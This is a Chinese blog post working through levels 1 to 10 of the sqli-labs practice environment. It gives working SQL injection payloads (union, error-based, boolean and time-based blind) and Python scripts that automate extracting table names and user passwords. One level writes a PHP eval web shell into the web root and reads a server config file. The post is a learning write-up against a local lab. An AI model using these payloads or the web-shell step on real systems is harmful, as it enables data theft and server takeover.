---
title: sqli-labs练习（less1-10）
url: 102.html
id: 102
categories:
  - sql注入
  - 学习笔记
date: 2017-12-10 18:06:52
tags:
---

为了学习的便利性，我在一些文件中都出了sql语句

### less-1

先理清一下**注入动机**：目的是为了获取账号密码，于是得获取对应的表名、字段名、数据库名，并得绕过一些设定，从而获取你想要的数据库中的数据。 自己做个一个**注入流程**： ![](http://www.kingkk.com/wp-content/uploads/2017/12/W2EE@TW20@CA4SVO.png) 接下来**开始注入：** 输入单引号，引起错误，说明存在注入点 ![](http://www.kingkk.com/wp-content/uploads/2017/12/1.png) 通过#将后面引号注释掉（此处直接打#并没有进行编码，要自己编码为%23），成功注释了后面的单引号 ![](http://www.kingkk.com/wp-content/uploads/2017/12/2.png) 

通过order by 确认行数为 3

![](http://www.kingkk.com/wp-content/uploads/2017/12/5.png)

然后继续利用union select 1,2,3，发现并没有返回1，2，3这几个数字 ![](http://www.kingkk.com/wp-content/uploads/2017/12/3.png) 究其原因，因为代码中仅仅mysql\_fetch\_array了一次，所以只能返回第一列的数据。这时仅需将id的值置为一个不存在的值即可（如-1） ![](http://www.kingkk.com/wp-content/uploads/2017/12/4.png) 发现，返回的值仅有2、3，可以利用的点比较少，这时可以利用concat\_ws()函数将数据连接，同时获取到了版本信息，连接用户，当前数据库 然后从information\_schema中获取表的信息（**注意**：security需要进行16进制编码，或者用引号引起来，推荐使用编码） ![](http://www.kingkk.com/wp-content/uploads/2017/12/c7659ce8da7cadacc0ad6088e8bd7570.png) 再通过limit依此获取到四个表名emails、referers、uagents、users。显然users才是我们需要的表，然后再次获取列名 ![](http://www.kingkk.com/wp-content/uploads/2017/12/9fa678e16d46d84acdf9e2dbf0293149.png) 获取到了id、username、password这些列名 获取到表名和列名之后，就可以直接获取里面的数据啦 ![](http://www.kingkk.com/wp-content/uploads/2017/12/b1805b2319c9c14faa1db67f31db7391.png)  

### less-2

一样的通过id = 1'进行测试 ![](http://www.kingkk.com/wp-content/uploads/2017/12/d58da6dfce3ad27803f27fde66473058.png) 猜测是数字型数据未加引号，当然其实输出来的sql语句可以直接看的出来 和less-1几乎一样，就是id的参数没用引号引起来 less-1 sql语句![](http://www.kingkk.com/wp-content/uploads/2017/12/923217b47321002e455984727efd6b73.png) less-2 sql语句![](http://www.kingkk.com/wp-content/uploads/2017/12/cb08ae0579653596bbc6b89dd975ac8d.png) 直接把less-1的payload中id后面的单引号去掉即可 ![](http://www.kingkk.com/wp-content/uploads/2017/12/f0855db638d64c9c6c95aa8b5bf94947.png)  

### less-3

同样的id=1'测试 ![](http://www.kingkk.com/wp-content/uploads/2017/12/f8f5bdd1569383d3f0858a934dc8634b.png) 但看报错的话会发现一个奇怪的 ），报错的语句主要是在near和at两个单词之间的语句。猜测左边应该也有个（ 与右括号进行闭合。然后再看输出的sql语句，来验证我们的想法，那么就变得很简单了，同样只需要构造右边的括号，然后注释掉剩余的即可  `id=1')%23` ![](http://www.kingkk.com/wp-content/uploads/2017/12/5f48ba40ae81fe0c8cf1357b7c2c500f.png)  

### less-4

一样进行id=1'测试,发现这回竟然没有报错，于是进行尝试双引号",爆出了错误 ![](http://www.kingkk.com/wp-content/uploads/2017/12/a55f11ae4833eaef5821e03f27fce25d.png) 判断变量应该是通过双引号引起来的，于此同时看到了熟悉的右括号 ），结合一下，构造payload:`id=1")%23` ![](http://www.kingkk.com/wp-content/uploads/2017/12/7c35d268303130b46ca16eb020a7ebd0.png)    

### less-5

一开始id=1'成功报错 然后id=1'#也成功绕过，但是。。。。。 ![](http://www.kingkk.com/wp-content/uploads/2017/12/2877ac76662af64256502eae9829d280.png) 什么数据都不显示，吓得我看了下源码 ![](http://www.kingkk.com/wp-content/uploads/2017/12/e8fdb6b70bae0924852f7b10a309a62d.png) 尼玛，这还真的什么都不显示。。这怎么获取利用信息呢。。 然后借鉴了一篇别人的博客（最后有提到），终于看明白了。这个less-5的目的就是为了让我们通过![](http://www.kingkk.com/wp-content/uploads/2017/12/3a6601455da142a2560113fb09d0e746.png)这个报错语句，来显示我们所需要的数据。原理如下： 有些厉害的测试工程师发现，将Group by clause与一个聚合函数一起使用，例如count(*)，可以将查询的部分内容作为错误信息返回。也就发展为今天的**二次注入查询**。 payload如下：xxx所要查询的语句 `?id=1' union select count(*),0, concat('~',(xxxx),'~', floor(rand()*2)) as a from information_schema.tables group by a%23` 构造的主要思想为：

1.  一开始还是可以通过order by获取知道有3个字段名的，然后依旧构造union select 1,2,3的语句
2.  然后在前面填充一个count(*),中间有多的话就空着好了，在最后3的位置，用concat或者concat_ws将你需要的数据与floor(rand()*2)连接在一起(为了方便观察可以加一些辅助符号如空格等)
3.  然后将这个语句 as a from information_schema.tables group by a 即可(其中as后面的a只要与group后的a同名即可，from后面的表只要是个存在的表即可)

然后只要在xxx语句中按照常规方法进行依此获取数据即可（在获取数据时可能有几次没有返回回显，多点击几次即可。而且每次读取的数据只能为一条）

### ![](http://www.kingkk.com/wp-content/uploads/2017/12/76d98b33edf91fc297de8c5c2b974d79.png)

 

### less-6

同样id=1'没报错，id=1" 报错，证明为双引号注入 然后通less-5原理，通过二次注入，得到password ![](http://www.kingkk.com/wp-content/uploads/2017/12/ed8bc7b40293e164dbf16c27faaf8b56.png)    

### less-7

一开始还是id=1'，报错（这回只有简单的提示语句错误） ![](http://www.kingkk.com/wp-content/uploads/2017/12/621ed90d715530e12749c740072288ea.png) 然后井号%23绕过,竟然不行，那就，id=1')%23 ,竟然还不行。。 原谅我菜，看了源码才知道居然有两个括号，那就id=1'))%23绕过，这回OK了 然后就是开始导入文件导入文件。写着写着发现导入的绝对地址不知道，于是通过其他less,配合下面两个函数，获取路径

*   @@datadir 读取数据库路径
*   @@basedir 获取Mysql安装路径

![](http://www.kingkk.com/wp-content/uploads/2017/12/0dbec570ea5c25186c714c4bdb84f76d.png) 然后就开始写如一句话，注意下地址的斜杠, \\\ or / 两种方式，还有post中的引号要用双引号" 否则会与之前sql语句中的单引号闭合 payload: `?id=1')) union select 1,2,'<?php @eval($_POST["kingkk"]);?>' into outfile 'D:/Program Files/wamp/www/sqli-labs/Less-7/test.php' %23` ![](http://www.kingkk.com/wp-content/uploads/2017/12/ee5981854d739358c32ce0dba395f516.png) 成功写入一句话，实战中就开始连菜刀把![](http://www.kingkk.com/wp-content/uploads/2017/12/6ff9fcd8d639f9acb5d3422a9f92200a.png) 出了导入文件，以及导出文件 `?id=1')) union select 1,2,load_file('D:/Program Files/wamp/bin/mysql/mysql5.6.17/my.ini')into outfile 'D:/Program Files/wamp/www/sqli-labs/Less-7/ini.txt' %23` ![](http://www.kingkk.com/wp-content/uploads/2017/12/ee34c45ffd06669d4ddaf237728153fe.png) 成功导出my.ini文件    

### less-8

进行简单的测试，发现，正确时返回一句固定的话，错误时没有提示语句，那也就意味着无法通过显示以及报错来获取想要的数据 此时就需要通过布尔盲注进行注入，主要思想是通过正确与错误时输出的不同，再连接上and 语句，然后依次比较ascii大小，来获得数据 payload: `?id=1' and ascii(substr((select database()),1,1))>64 %23` 修改select database（）成你想要的语句，然后依此修改substr的第二个参数，以及大于后面的数字，来获取数据，当ascii=0时表示数据截止，找到出现错误并且比较的数字是最小的那个数字即为当前字母（即刚好出错）的ascii。 布尔盲注比较费时费力，一般通过脚本进行跑。如下是我本人自己写的脚本，不得不说代码功底的确很差，本来想写二分法的，后来搞得自己有点晕，就没优化了，看来寒假是有必要好好学下数据结构和算法了。真的菜到抠脚。

#encoding=utf8
import requests 

url = 'http://localhost/sqli-labs-master/Less-8/'


def loop(sql):
	info = ""
	asc_range = \[0\]+range(20,123)
	for i in xrange(1,20):
		for x in asc_range:
			params = {'id':"1' and ascii(substr(({2}),{1},1))>{0} #".format(x,i,sql)}
			r = requests.get(url,params=params)
			if len(r.text)==722:
				if x==0:
					print 
					return info
				break;
		print chr(x),
		info+=chr(x)

def get_database():
	sql = 'select database()'
	print u"当前数据库为："
	return loop(sql)

def get_tables(database):
	sqls = \[\]
	info = \[\] #存放表的数组
	for x in range(10):
		sqls.append('select table\_name from information\_schema.tables where table_schema="{0}" limit {1},1'.format(database,x))
	for sql in sqls:
		res = loop(sql)	
		if res!="":
			info.append(res)
		else:
			return info
def get_columns(database,table):
	sqls = \[\]
	info = \[\]
	for x in range(10):
		sqls.append('select column\_name from information\_schema.columns where table\_schema="{0}" and table\_name = "{2}" limit {1},1'.format(database,x,table))
	for sql in sqls:
		res = loop(sql)	
		if res!="":
			info.append(res)
		else:
			return info

def get_content(database,table,columns):
	sqls = \[\]
	info = \[\]
	for x in range(10):
		sqls.append('select {0} from {1}.{2} limit {3},1'.format(columns,database,table,x))
	for sql in sqls:
		res = loop(sql)	
		if res!="":
			info.append(res)
		else:
			return info
def main():
	current\_database = get\_database()
	tables = get\_tables(current\_database)
	columns = get\_columns(current\_database,tables\[3\])
	get\_content(current\_database,tables\[3\],columns\[2\])

if \_\_name\_\_ == '\_\_main\_\_':
	main()

输出结果如下：

s e c u r i t y
e m a i l s
r e f e r e r s
u a g e n t s
u s e r s

i d
u s e r n a m e
p a s s w o r d

D u m b
I - k i l l - y o u
p @ s s w o r d
c r a p p y
s t u p i d i t y
g e n i o u s
m o b ! l e
a d m i n
a d m i n 1
a d m i n 2

思路也是一样，依此通过 库->表->列->数据 这样来依此获取。虽然写的有点菜，但勉强能用把，以后会二分了再来优化下好了。。  

### less-9

发现不管怎么测试,SQL语句有无错误，显示都是相同的。这点通过查看源码也能验证，所以，通过sleep函数，来检测是否有可以注入 `?id=1' and sleep(5) %23` sleep时会呈现这种阻塞状态，时间为sleep中的参数（秒），所以就通过有无阻塞来判断if的第一个参数是否为真 if的用法：if（a，b，c），a为真时返回b，否则返回c。所以payload中前者为假则进入阻塞 ![](http://www.kingkk.com/wp-content/uploads/2017/12/95dcae83398838fae92227832d240ec6.png) 然后附上payload:`?id=1' and if(ascii(substr((select database()),1,1))>130,0,sleep(3)) %23`(因为是本地服务器，延迟较小，sleep时间可以缩短些，实际注入中要按网络延迟来判定) 接下来代码部分和之前less-8几乎一样，只要将payload部分，以及判断语句修改一下即可，下面仅附上loop部分的代码

def loop(sql):
	info = ""
	asc_range = \[0\]+range(20,123)
	for i in xrange(1,20):    
		for x in asc_range:
			**params = {'id':"1' and if(ascii(substr(({2}),{1},1))>{0},0,sleep(3)) #".format(x,i,sql)}** 			**start_time = time()**  //time（）函数需要提前 from time import time 导入
			**r = requests.get(url,params=params)
			end_time = time()
			con\_time = end\_time-start_time** 			**if con_time>3:** 				if x==0:
					print 
					return info
				break;
		print chr(x),
		info+=chr(x)

   

### less-10

依旧基于时间的布尔盲注，只是引号是双引号，稍微修改下payload即可 `id=1' and sleep(3)%23` 脚本也就不放了，也就是把payload部分改了就行，和less-9几乎完全一样  

### 总结：

最后来总结下这less1-10

*   `less-1 基于单引号的字符型注入`：闭合单引号即可
*   `less-2 基于错误的get整型注入`：无需闭合单引号
*   `less-3 基于错误的get单引号变形字符型注入`： 根据错误提示，闭合括号与单引号
*   `less-4 基于错误的get双引号字符型注入`: 根据错误提示闭合双引号与括号
*   `less-5 双注入get单引号字符型注入`： 通过联合使用 count(*)、group by 、concat_ws()、floor(rand()*2)的形式将数据通过报错显示出来
*   `less-6 双注入get双引号字符型注入`：同上，闭合号使用双引号即可
*   `less-7 导出文件get字符型注入`：通过into outfile导入与导出文件
*   `less-8 布尔型单引号get盲注`：通过连接and ascii(substr((xxx),1,1))>64的形式，根据返回页面不同判定数据
*   `less-9 基于时间的GET单引号盲注`: 通过if 以及sleep函数，根据响应的时间判断数据
*   `less-10 基于时间的双引号盲注`：同上，闭合符号使用双引号即可

基本的测试：单引号 '   双引号"   单括号)   双括号)) 根据不同的情况可以选择不同的注入方式（不唯一） `有报错语句，有显示数据`：直接通过报错语句修改语法，通过显示的数据获取想要的信息 `有报错语句，无显示数据`：通过双注入来从报错语句中获取信息 `无报错语句，有显示数据`：通过不断测试，猜测可能的闭合语句，然后注入 `无报错语句，根据sql语句正确与否显示数据不同`：通过布尔型盲注进行注入 `无报错语句，根据sql语句正确与否显示数据相同`：通过基于时间的盲注进行注入     最后感谢一下这篇博客，写的很好，很详细，也借鉴了许多 [http://blog.csdn.net/u012763794/article/details/51207833](http://blog.csdn.net/u012763794/article/details/51207833) 以及[http://blog.csdn.net/nixawk/article/details/27804385](http://blog.csdn.net/nixawk/article/details/27804385)